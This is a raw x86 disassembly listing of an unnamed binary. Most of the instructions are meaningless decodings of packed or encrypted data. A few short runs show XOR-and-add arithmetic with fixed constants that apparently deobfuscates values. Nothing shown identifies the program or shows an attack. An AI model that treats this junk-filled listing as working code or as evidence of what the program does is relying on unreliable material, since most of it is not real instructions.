  40d61d:	(bad)  
  40d61f:	rcr    BYTE PTR [edx],0x35
  40d622:	push   edx
  40d623:	sub    dl,BYTE PTR [eax+0x15]
  40d626:	test   al,0x8b
  40d628:	cmp    al,0x4a
  40d62a:	mov    cl,0xf5
  40d62c:	out    0xc2,eax
  40d62e:	sbb    eax,0x2bb573f6
  40d633:	popf   
  40d634:	into   
  40d635:	aam    0xc3
  40d637:	or     bh,0x42
  40d63a:	pop    esp
  40d63b:	ds push ebp
  40d63d:	rcr    BYTE PTR [ebp-0x58871fc9],0x64
  40d644:	or     esi,DWORD PTR [ecx]
  40d646:	inc    ebx
  40d647:	add    dh,BYTE PTR [ecx+0x27e738d4]
  40d64d:	cmc    
  40d64e:	cmp    dl,BYTE PTR [ebx+ecx*2+0x74f029fb]
  40d655:	es dec ebp
  40d657:	cdq    
  40d658:	arpl   WORD PTR [edx+0x7797e6d8],si
  40d65e:	mov    ds:0x8b0f4ba3,al
  40d663:	ret    0x6496
  40d666:	and    al,0xae
  40d668:	pushf  
  40d669:	push   0xffffffaf
  40d66b:	xlat   BYTE PTR ds:[ebx]
  40d66c:	dec    eax
  40d66d:	adc    esi,eax
  40d66f:	int3   
  40d670:	xchg   ecx,eax
  40d671:	sahf   
  40d672:	or     esi,DWORD PTR [ebx+0x87dfd14]
  40d678:	sub    edx,DWORD PTR [edi-0x18]
  40d67b:	pop    es
  40d67c:	daa    
  40d67d:	dec    eax
  40d67e:	hlt    
  40d67f:	(bad)  [esi]
  40d681:	loope  0x40d605
  40d683:	adc    al,0xd5
  40d685:	dec    ebp
  40d686:	in     al,dx
  40d687:	push   esi
  40d688:	mov    esi,DWORD PTR [ebp+0x70]
  40d68b:	test   ch,ah
  40d68d:	push   0x737b646a
  40d692:	(bad)  
  40d694:	push   ds
  40d695:	jmp    0x660e:0x718a4043
  40d69c:	mov    ebx,DWORD PTR [ecx-0x54]
  40d69f:	push   eax
  40d6a0:	(bad)  
  40d6a1:	pushf  
  40d6a2:	int    0x14
  40d6a4:	and    eax,0xa56f6d81
  40d6a9:	dec    ecx
  40d6aa:	push   ebx
  40d6ab:	add    DWORD PTR [edx+0x5],edx
  40d6ae:	lock mov DWORD PTR [eax],ecx
  40d6b1:	aas    
  40d6b2:	dec    eax
  40d6b3:	aam    0xee
  40d6b5:	mov    edi,0xa64a09e4
  40d6ba:	shl    BYTE PTR [ebp+0x15a47d11],1
  40d6c0:	outs   dx,DWORD PTR ds:[esi]
  40d6c1:	out    0x1e,al
  40d6c3:	pop    eax
  40d6c4:	outs   dx,BYTE PTR ds:[esi]
  40d6c5:	fdiv   QWORD PTR [ebp-0x6e]
  40d6c8:	leave  
  40d6c9:	or     cl,BYTE PTR [ebx-0xe66f9a2]
  40d6cf:	pop    ecx
  40d6d0:	fsubr  st,st(2)
  40d6d2:	frstor [edx+0x7ad9fc45]
  40d6d8:	xchg   esi,eax
  40d6d9:	xchg   ebx,eax
  40d6da:	dec    esp
  40d6db:	push   es
  40d6dc:	mov    DWORD PTR [esi+0x3e],eax
  40d6df:	pushf  
  40d6e0:	lea    esi,[ecx-0x3955f4a]
  40d6e6:	xor    ch,0x25
  40d6e9:	push   ebx
  40d6ea:	test   dl,dh
  40d6ec:	adc    ah,BYTE PTR [edx]
  40d6ee:	arpl   WORD PTR [ebx+0x5435fc45],cx
  40d6f4:	or     BYTE PTR [ecx+0x7],dl
  40d6f7:	jmp    0x40d57a
  40d6fc:	mov    eax,DWORD PTR [ebp+0xc]
  40d6ff:	add    eax,DWORD PTR [ebp+0x8]
  40d702:	mov    DWORD PTR [ebp-0x10],eax
  40d705:	mov    eax,DWORD PTR [ebp-0x1c]
  40d708:	test   eax,eax
  40d70a:	je     0x40de47
  40d710:	mov    DWORD PTR [ebp-0x24],esi
  40d713:	push   0xb
  40d715:	jmp    0x40d85e
  40d71a:	dec    esi
  40d71b:	(bad)  
  40d71c:	xchg   ebx,eax
  40d71d:	mov    bh,0x93
  40d71f:	jae    0x40d78b
  40d721:	out    0x84,eax
  40d723:	push   ss
  40d724:	(bad)  
  40d725:	mov    WORD PTR [ebp+0x5e48b6a],cs
  40d72b:	lea    edi,[esi+0x7e]
  40d72e:	and    bh,BYTE PTR [edi+0x7e]
  40d731:	jle    0x40d74b
  40d733:	mov    ecx,0x9b776c75
  40d738:	sbb    DWORD PTR [ebx+ebp*4],0x44190518
  40d73f:	mov    edi,0xc09b15eb
  40d744:	push   0xffffffd8
  40d746:	lahf   
  40d747:	enter  0x3b2e,0xfb
  40d74b:	ss clc 
  40d74d:	aad    0x3f
  40d74f:	inc    ebp
  40d750:	mov    al,0xf0
  40d752:	xchg   esp,eax
  40d753:	sbb    al,0xc1
  40d755:	adc    DWORD PTR [edx],ecx
  40d757:	sbb    al,0x9
  40d759:	xor    bh,bh
  40d75b:	push   ecx
  40d75c:	add    DWORD PTR ds:0xe19f08a1,edx
  40d762:	clc    
  40d763:	cmc    
  40d764:	sub    eax,0x49b1016b
  40d769:	push   es
  40d76a:	scas   al,BYTE PTR es:[edi]
  40d76b:	out    0x9a,eax
  40d76d:	ror    esi,1
  40d76f:	sub    edx,DWORD PTR [edx-0x38]
  40d772:	retf   
  40d773:	or     al,0xff
  40d775:	out    dx,eax
  40d776:	je     0x40d723
  40d778:	popa   
  40d779:	repnz xchg esi,eax
  40d77b:	cmp    BYTE PTR [edi+0xc5c7e7d],ch
  40d781:	mul    BYTE PTR [edx]
  40d783:	sti    
  40d784:	push   esp
  40d785:	icebp  
  40d786:	mov    edi,0x990e4a64
  40d78b:	mov    dl,0xc7
  40d78d:	iret   
  40d78e:	jl     0x40d719
  40d790:	dec    ecx
  40d791:	pop    esp
  40d792:	mov    dl,0xe2
  40d794:	mov    bl,0xd2
  40d796:	pop    es
  40d797:	add    dh,BYTE PTR [eax-0x9bcba6b]
  40d79d:	dec    eax
  40d79e:	jb     0x40d766
  40d7a0:	push   edx
  40d7a1:	ins    BYTE PTR es:[edi],dx
  40d7a2:	loop   0x40d77c
  40d7a4:	cmp    BYTE PTR [eax+edi*1-0x3b],0xfa
  40d7a9:	and    eax,0x5d0458d1
  40d7ae:	sub    eax,DWORD PTR [edx]
  40d7b0:	pusha  
  40d7b1:	jecxz  0x40d7e6
  40d7b3:	ins    BYTE PTR es:[edi],dx
  40d7b4:	push   0xffffff9a
  40d7b6:	nop
  40d7b7:	imul   eax,eax,0xfafa0f54
  40d7bd:	jge    0x40d83b
  40d7bf:	je     0x40d7ab
  40d7c1:	adc    dh,0x5
  40d7c4:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7c6:	inc    esi
  40d7c7:	jae    0x40d7a9
  40d7c9:	std    
  40d7ca:	cmp    ecx,DWORD PTR [ebx-0x36]
  40d7cd:	sti    
  40d7ce:	mov    ebp,0xb66a37b8
  40d7d3:	pop    ecx
  40d7d4:	out    dx,eax
  40d7d5:	pop    es
  40d7d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7d7:	sbb    esi,DWORD PTR [edx+0x1ad89ed7]
  40d7dd:	cs int 0x43
  40d7e0:	adc    DWORD PTR [ebx+ebx*4+0x55],0xffffffe0
  40d7e5:	push   esp
  40d7e6:	or     esi,edi
  40d7e8:	push   ds
  40d7e9:	mov    dh,0x51
  40d7eb:	xor    eax,0xff8546f0
  40d7f0:	test   DWORD PTR [edx],ebx
  40d7f2:	push   ss
  40d7f3:	frstor ds:0xa8bfff15
  40d7f9:	push   ds
  40d7fa:	pop    edi
  40d7fb:	adc    BYTE PTR [edx],ch
  40d7fd:	data16 daa 
  40d7ff:	test   al,0x49
  40d801:	pushf  
  40d802:	adc    eax,0x3cb8185f
  40d807:	or     BYTE PTR [ebp+0x2e],cl
  40d80a:	repnz xor edx,eax
  40d80d:	pop    edx
  40d80e:	sub    DWORD PTR [esp+eax*4+0x7fd0c3e9],ecx
  40d815:	mov    al,0x4a
  40d817:	les    ecx,FWORD PTR [edi]
  40d819:	jno    0x40d879
  40d81b:	jmp    0xb6b2:0x8c0c00b9
  40d822:	and    eax,0x9ca13cba
  40d827:	std    
  40d828:	mov    bl,0xcf
  40d82a:	mov    esp,0x7a424fe9
  40d82f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d830:	and    dl,bh
  40d832:	sub    BYTE PTR [esp+eax*2],cl
  40d835:	mov    dh,0x76
  40d837:	sub    BYTE PTR [eax-0x19],bh
  40d83a:	out    dx,al
  40d83b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d83c:	jp     0x40d846
  40d83e:	sub    ecx,DWORD PTR [edx+0x73]
  40d841:	imul   ecx,DWORD PTR [ebx+0x4034b35b],0x70
  40d848:	jmp    FWORD PTR [ebp-0x76]
  40d84b:	inc    esi
  40d84c:	mov    ah,0x87
  40d84e:	int    0xdc
  40d850:	punpckldq mm2,mm1
  40d853:	sub    edi,DWORD PTR [eax]
  40d855:	cdq    
  40d856:	xor    bh,cl
  40d858:	or     edx,0xffffffc6
  40d85b:	es cmc 
  40d85d:	add    DWORD PTR [ecx+0x6a],ebx
  40d860:	add    eax,0xcb875b49
  40d865:	sub    ebx,ecx
  40d867:	jmp    0x40d9b0
  40d86c:	adc    edx,DWORD PTR [edi+esi*2]
  40d86f:	jae    0x40d8e2
  40d871:	jno    0x40d886
  40d873:	je     0x40d880
  40d875:	(bad)  
  40d876:	adc    ecx,edx
  40d878:	xchg   DWORD PTR [esi+0x75],edi
  40d87b:	icebp  
  40d87c:	sub    DWORD PTR [edx+0x7f227e7e],ecx
  40d882:	jle    0x40d902
  40d884:	jae    0x40d857
  40d886:	sti    
  40d887:	pop    ecx
  40d888:	push   cs
  40d889:	add    eax,0x686dfa66
  40d88e:	add    al,0x9
  40d890:	xchg   ebp,eax
  40d891:	cmp    eax,0x1dd1b8ce
  40d896:	sar    BYTE PTR [ebp-0x27fd374e],1
  40d89c:	xor    edi,DWORD PTR [edi+0x5f]
  40d89f:	jb     0x40d8b6
  40d8a1:	cmp    edx,DWORD PTR [ecx+0x5d6ac1a5]
  40d8a7:	ins    BYTE PTR es:[edi],dx
  40d8a8:	xchg   edx,eax
  40d8a9:	fwait
  40d8aa:	push   esi
  40d8ab:	scas   al,BYTE PTR es:[edi]
  40d8ac:	cmp    eax,esi
  40d8ae:	push   es
  40d8af:	push   0x3c1f8c98
  40d8b4:	cmp    dh,BYTE PTR [eax]
  40d8b6:	mov    ebx,0xfdf22726
  40d8bb:	dec    ebx
  40d8bc:	jo     0x40d843
  40d8be:	mov    dh,0x6c
  40d8c0:	fdivr  DWORD PTR [ebx]
  40d8c2:	or     dh,bl
  40d8c4:	jae    0x40d90d
  40d8c6:	add    eax,0x1622defc
  40d8cb:	dec    edx
  40d8cc:	popa   
  40d8cd:	sub    ah,BYTE PTR [edx+eax*1+0x74]
  40d8d1:	inc    edi
  40d8d2:	sub    al,0x76
  40d8d4:	div    BYTE PTR [esi]
  40d8d6:	ds inc ebx
  40d8d8:	push   esi
  40d8d9:	ja     0x40d8f0
  40d8db:	loop   0x40d92d
  40d8dd:	sub    edx,ebx
  40d8df:	clc    
  40d8e0:	fs out dx,eax
  40d8e2:	adc    eax,0xf13e7e7
  40d8e7:	mov    ds:0x82ea2346,al
  40d8ec:	push   cs
  40d8ed:	jo     0x40d88a
  40d8ef:	and    al,0x32
  40d8f1:	icebp  
  40d8f2:	jl     0x40d8b2
  40d8f4:	adc    al,0x2f
  40d8f6:	pop    ds
  40d8f7:	push   edi
  40d8f8:	or     esi,edx
  40d8fa:	sbb    dh,BYTE PTR [ebp+ebp*8-0x66]
  40d8fe:	fimul  WORD PTR [ecx]
  40d900:	ss ds sti 
  40d903:	out    0xa4,al
  40d905:	dec    ecx
  40d906:	stos   DWORD PTR es:[edi],eax
  40d907:	stc    
  40d908:	in     al,0xdf
  40d90a:	fisubr WORD PTR [ebx+ebp*8-0x19]
  40d90e:	mov    eax,ds:0xa426e266
  40d913:	ss sub al,0x2a
  40d916:	(bad)  
  40d917:	imul   esi,DWORD PTR [edi-0xb5fbf8a],0x31
  40d91e:	bnd jno 0x40d8ce
  40d921:	or     dl,BYTE PTR [ebx+0xf16874b]
  40d927:	push   edi
  40d928:	or     DWORD PTR [edx+0x2e9708fc],0x45
  40d92f:	arpl   WORD PTR [edi-0x77],bp
  40d932:	mov    ds:0xe377e34d,eax
  40d937:	xor    DWORD PTR [eax+0x46d911e4],esi
  40d93d:	jno    0x40d92b
  40d93f:	std    
  40d940:	je     0x40d936
  40d942:	fsubr  DWORD PTR [esi+0x356e1b30]
  40d948:	push   ebx
  40d949:	fsubr  st(5),st
  40d94b:	rcr    BYTE PTR [ebx-0x542bf45d],1
  40d951:	adc    bl,BYTE PTR ds:0xea7f5f0a
  40d957:	sub    eax,0xe1957e08
  40d95c:	jbe    0x40d9d9
  40d95e:	and    eax,0x16cdbb62
  40d963:	pop    esp
  40d964:	ins    DWORD PTR es:[edi],dx
  40d965:	arpl   ax,di
  40d967:	je     0x40d97e
  40d969:	sbb    dh,al
  40d96b:	data16 loop 0x40d936
  40d96e:	adc    al,0xd3
  40d970:	out    0x6a,al
  40d972:	shl    DWORD PTR [ebx],cl
  40d974:	lods   eax,DWORD PTR ds:[esi]
  40d975:	jmp    0xdc86e15e
  40d97a:	add    cl,cl
  40d97c:	fld    DWORD PTR [ebx-0x5d]
  40d97f:	sbb    dh,BYTE PTR [ecx-0x72]
  40d982:	push   ebp
  40d983:	not    DWORD PTR [ecx+0x52]
  40d986:	aas    
  40d987:	int3   
  40d988:	or     DWORD PTR [edx+0x50],ebp
  40d98b:	out    0x81,eax
  40d98d:	cmp    cl,BYTE PTR [eax]
  40d98f:	sub    esi,DWORD PTR [edx-0x3f548f0a]
  40d995:	mov    gs,WORD PTR [ebp-0x63]
  40d998:	pushf  
  40d999:	cmp    bh,BYTE PTR [edx-0x15]
  40d99c:	inc    esp
  40d99d:	les    ebx,FWORD PTR [eax]
  40d99f:	xacquire xchg BYTE PTR [ebp+0x5bfd85f8],bh
  40d9a6:	xchg   esi,eax
  40d9a7:	mov    ds:0xe11406b1,al
  40d9ac:	outs   dx,BYTE PTR ds:[esi]
  40d9ad:	xchg   edi,eax
  40d9ae:	iret   
  40d9af:	lock xchg ebx,ecx
  40d9b2:	jmp    0x40dafb
  40d9b7:	mov    ebx,0xf146cba5
  40d9bc:	jo     0x40da11
  40d9be:	mov    eax,ds:0x3f48df24
  40d9c3:	pop    esp
  40d9c4:	xchg   ebp,eax
  40d9c5:	xchg   esp,eax
  40d9c6:	scas   al,BYTE PTR es:[edi]
  40d9c7:	fisttp QWORD PTR [ebx+0x7f227e7e]
  40d9cd:	jle    0x40da4d
  40d9cf:	cld    
  40d9d0:	rcl    BYTE PTR [esi-0x1052cf58],1
  40d9d6:	fisub  DWORD PTR [ebp+ebx*2+0x309efb50]
  40d9dd:	js     0x40d984
  40d9df:	lods   al,BYTE PTR ds:[esi]
  40d9e0:	or     cl,BYTE PTR [edi-0x10]
  40d9e3:	xor    eax,0x260c9088
  40d9e8:	lahf   
  40d9e9:	push   es
  40d9ea:	mov    cs,WORD PTR ds:[edx+eax*4-0x20]
  40d9ef:	xor    ebp,DWORD PTR [ecx-0x34f4af6e]
  40d9f5:	add    BYTE PTR [eax],ch
  40d9f7:	xor    eax,0x32c0d932
  40d9fc:	mov    eax,fs:0x25e5d8aa
  40da02:	jg     0x40d99c
  40da04:	pop    ebx
  40da05:	cld    
  40da06:	sub    ebx,ecx
  40da08:	jo     0x40d992
  40da0a:	rcr    DWORD PTR [eax],1
  40da0c:	pop    esp
  40da0d:	dec    esp
  40da0e:	mov    BYTE PTR [ebx],ah
  40da10:	mov    ebx,0xa1defc66
  40da15:	xchg   BYTE PTR [ecx],ah
  40da17:	jnp    0x40d9f5
  40da19:	jp     0x40d9b9
  40da1b:	mov    ds,WORD PTR [ecx-0x51]
  40da1e:	test   al,0x8d
  40da20:	inc    edx
  40da21:	push   ds
  40da22:	out    0xc9,eax
  40da24:	push   ss
  40da25:	cmp    esp,DWORD PTR [ecx+eax*2]
  40da28:	imul   edi,ebp,0xfffffffe
  40da2b:	stc    
  40da2c:	jp     0x40da47
  40da2e:	sbb    al,0x90
  40da30:	mov    cl,0xd4
  40da32:	jg     0x40da67
  40da34:	out    dx,eax
  40da35:	dec    ebx
  40da36:	or     al,0x8d
  40da38:	xchg   ebx,eax
  40da39:	addr16 mov ch,0xf1
  40da3c:	or     BYTE PTR [eax+esi*4],al
  40da3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da40:	retf   0xcb7c
  40da43:	gs clc 
  40da45:	adc    BYTE PTR [edi-0x77],ch
  40da48:	ret    0x6f61
  40da4b:	jge    0x40da77
  40da4d:	inc    edx
  40da4e:	repz test BYTE PTR [edi+0x3],ch
  40da52:	mov    esi,0xcaf54b0e
  40da57:	popa   
  40da58:	in     al,0x1d
  40da5a:	push   ebp
  40da5b:	dec    edi
  40da5c:	stc    
  40da5d:	mov    DWORD PTR [ebp+0x3d],ecx
  40da60:	xchg   ebp,eax
  40da61:	loopne 0x40da03
  40da63:	cmc    
  40da64:	mov    edx,0x72b9dec0
  40da69:	sbb    eax,0x18554c31
  40da6e:	push   ebx
  40da6f:	jle    0x40da23
  40da71:	outs   dx,BYTE PTR ds:[esi]
  40da72:	inc    edx
  40da73:	mov    esi,0x8eeb4cde
  40da78:	dec    ebx
  40da79:	ja     0x40dabe
  40da7b:	popa   
  40da7c:	and    eax,0xc32299b0
  40da81:	(bad)  
  40da82:	shl    BYTE PTR [ebx+edx*4+0x7e],1
  40da86:	pop    ecx
  40da87:	dec    edi
  40da88:	scas   al,BYTE PTR es:[edi]
  40da89:	pop    ss
  40da8a:	pusha  
  40da8b:	or     DWORD PTR [ecx],0x4d5cf8ef
  40da91:	xchg   ebp,eax
  40da92:	sbb    al,0xe4
  40da94:	(bad)  
  40da96:	add    edx,esp
  40da98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da99:	call   0x955ae52c
  40da9e:	push   esi
  40da9f:	pop    esi
  40daa0:	clc    
  40daa1:	loopne 0x40db1a
  40daa3:	add    DWORD PTR [edx],edx
  40daa5:	push   edx
  40daa6:	(bad)  
  40daa7:	jg     0x40da2a
  40daa9:	jno    0x40da53
  40daab:	rol    DWORD PTR [ebx],1
  40daad:	(bad)
  40dab0:	mov    eax,0xb30bd2cd
  40dab5:	mov    dh,0x34
  40dab7:	pop    eax
  40dab8:	mov    ch,0xc3
  40daba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dabb:	aas    
  40dabc:	mov    al,0x92
  40dabe:	(bad)  
  40dabf:	or     al,0x29
  40dac1:	leave  
  40dac2:	aam    0x60
  40dac4:	and    al,0xd4
  40dac6:	ins    BYTE PTR es:[edi],dx
  40dac7:	push   eax
  40dac8:	add    BYTE PTR [ecx-0x17],dl
  40dacb:	rcl    BYTE PTR [esi+ebp*2-0x305e3306],1
  40dad2:	cli    
  40dad3:	push   ebx
  40dad4:	leave  
  40dad5:	ss mov al,ds:0xe9dc1341
  40dadc:	mov    BYTE PTR [eax],dl
  40dade:	in     eax,0x40
  40dae0:	push   0xac535ab9
  40dae5:	mov    esp,0x15848d0c
  40daea:	jmp    0x40da8b
  40daec:	push   eax
  40daed:	clc    
  40daee:	fwait
  40daef:	ror    DWORD PTR [ebx+ebx*1+0x50],1
  40daf3:	outs   dx,BYTE PTR ds:[esi]
  40daf4:	jno    0x40db3d
  40daf6:	sti    
  40daf7:	lahf   
  40daf8:	or     BYTE PTR [esi],cl
  40dafa:	or     BYTE PTR [ecx-0x75],0x45
  40dafe:	in     al,0xf
  40db00:	scas   eax,DWORD PTR es:[edi]
  40db01:	shr    DWORD PTR [ebx],0xe0
  40db04:	mov    DWORD PTR [ebp-0x24],esp
  40db07:	mov    eax,DWORD PTR [ebp-0x4]
  40db0a:	mov    ecx,0x7510854
  40db0f:	xor    eax,ecx
  40db11:	mov    edx,0x32729b
  40db16:	add    eax,edx
  40db18:	mov    DWORD PTR [ebp+0x8],eax
  40db1b:	mov    eax,DWORD PTR [ebp-0x18]
  40db1e:	xor    eax,ecx
  40db20:	jmp    0x40dc69
  40db25:	fsub   DWORD PTR [edx+0x35701da8]
  40db2b:	imul   esp,DWORD PTR [ebx+0x3b],0x2ab6fdf0
  40db32:	movlps xmm2,QWORD PTR [edx]
  40db35:	or     DWORD PTR [eax+0x7f227e7e],0x60ba7e7e
  40db3f:	dec    edx
  40db40:	inc    ecx
  40db41:	mov    ds:0xc80fde2,al
  40db46:	pop    esp
  40db47:	repz and DWORD PTR [ebx+0x4],ebx
  40db4b:	mov    eax,ebx
  40db4d:	cdq    
  40db4e:	inc    ebx
  40db4f:	sbb    esp,DWORD PTR [edx+edx*8-0x3e]
  40db53:	xor    DWORD PTR [esp+edi*1],esi
  40db56:	test   BYTE PTR [edi+0x55],bh
  40db59:	scas   eax,DWORD PTR es:[edi]
  40db5a:	pusha  
  40db5b:	jp     0x40db8e
  40db5d:	sub    eax,0x50c61bbf
  40db62:	fsubr  QWORD PTR [edx+0x6e]
  40db65:	mov    ecx,DWORD PTR [ebp+0x70716bcf]
  40db6b:	outs   dx,DWORD PTR ds:[esi]
  40db6c:	mov    esp,0x72c23062
  40db71:	push   esp
  40db72:	xchg   ebp,eax
  40db73:	lods   al,BYTE PTR ds:[esi]
  40db74:	push   edi
  40db75:	cmp    ch,BYTE PTR [ecx+0x43c6293c]
  40db7b:	int3   
  40db7c:	(bad)  
  40db7d:	pop    ebx
  40db7e:	dec    ebp
  40db7f:	cmp    bl,bh
  40db81:	(bad)  
  40db82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db83:	inc    edi
  40db84:	xchg   ebx,eax
  40db85:	nop
  40db86:	xchg   esi,eax
  40db87:	mov    cl,0xd7
  40db89:	xchg   esp,eax
  40db8a:	sahf   
  40db8b:	push   ebp
  40db8c:	stos   DWORD PTR es:[edi],eax
  40db8d:	xchg   ebp,eax
  40db8e:	rcr    BYTE PTR ds:0x333c5dbb,cl
  40db94:	dec    edi
  40db95:	or     edx,eax
  40db97:	inc    eax
  40db98:	fld    TBYTE PTR [edx]
  40db9a:	rol    DWORD PTR [ecx],cl
  40db9c:	adc    eax,0x8a686b90
  40dba1:	shr    DWORD PTR [edx+0x26],cl
  40dba4:	or     bl,BYTE PTR [edx-0x75fadfef]
  40dbaa:	hlt    
  40dbab:	scas   al,BYTE PTR es:[edi]
  40dbac:	call   0x32cc:0x490e146a
  40dbb3:	repz adc DWORD PTR [ebp+esi*8-0x6bfa8ae1],0x5c
  40dbbc:	out    dx,al
  40dbbd:	int3   
  40dbbe:	pop    ecx
  40dbbf:	test   eax,0x9f30be77
  40dbc4:	test   DWORD PTR [ebx+0x6d89a7a6],esp
  40dbca:	inc    ecx
  40dbcb:	pop    edx
  40dbcc:	xchg   DWORD PTR [edx],esp
  40dbce:	xor    al,0x39
  40dbd0:	sub    eax,0x4cf563c8
  40dbd5:	out    0x16,al
  40dbd7:	inc    ecx
  40dbd8:	iret   
  40dbd9:	ins    BYTE PTR es:[edi],dx
  40dbda:	stos   DWORD PTR es:[edi],eax
  40dbdb:	and    BYTE PTR [esi+ebp*2+0x277bfab1],al
  40dbe2:	cld    
  40dbe3:	arpl   WORD PTR [ecx+0x48b9b1c2],ax
  40dbe9:	scas   eax,DWORD PTR es:[edi]
  40dbea:	cdq    
  40dbeb:	in     al,dx
  40dbec:	or     cl,BYTE PTR [edi-0x5c]
  40dbef:	and    DWORD PTR [ebx+0x3957f9b2],esp
  40dbf5:	loopne 0x40db82
  40dbf7:	cmp    dl,bl
  40dbf9:	mov    ?,WORD PTR [ebx]
  40dbfb:	and    eax,0x724d0f3d
  40dc00:	daa    
  40dc01:	pop    ebp
  40dc02:	hlt    
  40dc03:	repz jge 0x40dc6b
  40dc06:	lahf   
  40dc07:	push   esi
  40dc08:	mov    eax,0x539bb654
  40dc0d:	xor    bh,BYTE PTR [esi]
  40dc0f:	dec    esi
  40dc10:	jae    0x40db9b
  40dc12:	(bad)  
  40dc13:	cld    
  40dc14:	cmp    cl,bl
  40dc16:	sbb    edx,DWORD PTR [edx+edi*8]
  40dc19:	dec    esi
  40dc1a:	ins    BYTE PTR es:[edi],dx
  40dc1b:	inc    esp
  40dc1c:	push   eax
  40dc1d:	xchg   dl,bl
  40dc1f:	lea    ebx,[eax+0x7]
  40dc22:	jle    0x40dc16
  40dc24:	inc    BYTE PTR [esp+ebp*8]
  40dc27:	sub    esp,esi
  40dc29:	retf   
  40dc2a:	mul    DWORD PTR [edi]
  40dc2c:	in     eax,0xc
  40dc2e:	and    bh,BYTE PTR [edi+0x44]
  40dc31:	xchg   esi,eax
  40dc32:	aam    0x3
  40dc34:	add    bh,BYTE PTR [edi-0x3bd39227]
  40dc3a:	lds    esi,FWORD PTR [eax]
  40dc3c:	stos   DWORD PTR es:[edi],eax
  40dc3d:	add    ebp,DWORD PTR [edi+0x63bc1d6f]
  40dc43:	inc    sp
  40dc45:	jns    0x40dc97
  40dc47:	mov    ss,WORD PTR [ebp-0x2e465827]
  40dc4d:	xchg   ecx,eax
  40dc4e:	outs   dx,DWORD PTR ds:[esi]
  40dc4f:	cmp    BYTE PTR ds:0x7adf3196,0xb9
  40dc56:	sub    BYTE PTR [edx+0x7df7a233],dh
  40dc5c:	dec    eax
  40dc5d:	cmp    edx,edi
  40dc5f:	pop    edi
  40dc60:	clc    
  40dc61:	mov    al,ds:0xdae410b8
  40dc66:	jmp    0x40dcda
  40dc68:	sbb    al,BYTE PTR [ebx]
  40dc6a:	ret    0x558b
  40dc6d:	adc    al,0xf
  40dc6f:	scas   eax,DWORD PTR es:[edi]
  40dc70:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  40dc76:	mov    ecx,DWORD PTR [ebp+0x8]
  40dc79:	lea    ecx,[edx+ecx*1+0x32729b]
  40dc80:	cmp    ecx,eax
  40dc82:	je     0x40de42
  40dc88:	mov    edi,DWORD PTR [ebp-0x18]
  40dc8b:	mov    eax,DWORD PTR [ebp+0x8]
  40dc8e:	mov    edx,DWORD PTR [ebp+0x14]
  40dc91:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40dc95:	mov    ecx,0x7510854
  40dc9a:	xor    edx,edx
  40dc9c:	xor    edi,ecx
  40dc9e:	mov    esi,0x32729b
  40dca3:	add    edi,esi
  40dca5:	div    edi
  40dca7:	mov    edx,DWORD PTR [ebp-0x4]
  40dcaa:	xor    edx,ecx
  40dcac:	lea    eax,[edx+eax*1+0x32729b]
  40dcb3:	mov    edx,DWORD PTR [ebp+0x8]
  40dcb6:	mov    edi,DWORD PTR [ebp-0x24]
  40dcb9:	mov    DWORD PTR [edi+edx*4],eax
  40dcbc:	mov    eax,DWORD PTR [ebp-0x18]
  40dcbf:	mov    edx,DWORD PTR [ebp+0x8]
  40dcc2:	xor    eax,ecx
  40dcc4:	lea    eax,[eax+edx*1+0x32729b]
  40dccb:	jmp    0x40de14
  40dcd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcd1:	scas   eax,DWORD PTR es:[edi]
  40dcd2:	and    eax,0xb1913513
  40dcd7:	stos   DWORD PTR es:[edi],eax
  40dcd8:	jp     0x40dc9c
  40dcda:	mov    ch,0x9b
  40dcdc:	push   edi
  40dcdd:	leave  
  40dcde:	in     eax,0x9a
  40dce0:	mov    ch,0x89
  40dce2:	jle    0x40dd62
  40dce4:	and    bh,BYTE PTR [edi+0x7e]
  40dce7:	jle    0x40dce1
  40dce9:	inc    DWORD PTR [ebx+0x37]
  40dcec:	mov    bh,0x89
  40dcee:	nop
  40dcef:	push   0x912596f0
  40dcf4:	xor    al,0x97
  40dcf6:	idiv   BYTE PTR [esi+0x3]
  40dcf9:	out    dx,al
  40dcfa:	sub    al,0x9b
  40dcfc:	cmp    eax,0xc9373518
  40dd01:	call   0x9561:0xbd5471da
  40dd08:	and    BYTE PTR [edi-0x1],al
  40dd0b:	push   ebp
  40dd0c:	call   0xb3d9:0xf87a6562
  40dd13:	xchg   ebp,eax
  40dd14:	mov    edx,0xb3d606e2
  40dd19:	mov    DWORD PTR gs:[edi+0x470f0448],eax
  40dd20:	daa    
  40dd21:	out    dx,al
  40dd22:	jecxz  0x40dcfb
  40dd24:	cmp    BYTE PTR [edx-0x3f375a7c],bh
  40dd2a:	and    al,0x8d
  40dd2c:	pop    eax
  40dd2d:	mov    ?,WORD PTR [esp+edx*2]
  40dd30:	loope  0x40dd89
  40dd32:	out    dx,eax
  40dd33:	xor    DWORD PTR [edx-0x79764082],edx
  40dd39:	fstp   DWORD PTR [ecx-0xe]
  40dd3c:	pop    eax
  40dd3d:	es pusha 
  40dd3f:	mov    ds:0x30aaa928,al
  40dd44:	cmp    eax,0x744a3b47
  40dd49:	lea    ecx,ds:0xfc13911b
  40dd4f:	adc    edi,DWORD PTR [edx]
  40dd51:	aam    0x17
  40dd53:	enter  0xce9c,0x58
  40dd57:	and    DWORD PTR [edi-0x1d],ecx
  40dd5a:	hlt    
  40dd5b:	cmp    eax,0xc96c4b0e
  40dd60:	scas   eax,DWORD PTR es:[edi]
  40dd61:	call   0x731c:0xabb5a9ff
  40dd68:	bound  edx,QWORD PTR [ebx-0x59ad94c5]
  40dd6e:	mov    edx,cs
  40dd70:	mov    ds:0x6cd76269,eax
  40dd75:	pop    ds
  40dd76:	fwait
  40dd77:	sbb    bl,al
  40dd79:	and    eax,DWORD PTR [ebx]
  40dd7b:	lods   al,BYTE PTR ds:[esi]
  40dd7c:	and    esp,esi
  40dd7e:	out    0xe4,al
  40dd80:	adc    DWORD PTR [ecx+0x282b7cdb],ebx
  40dd86:	out    0x5b,al
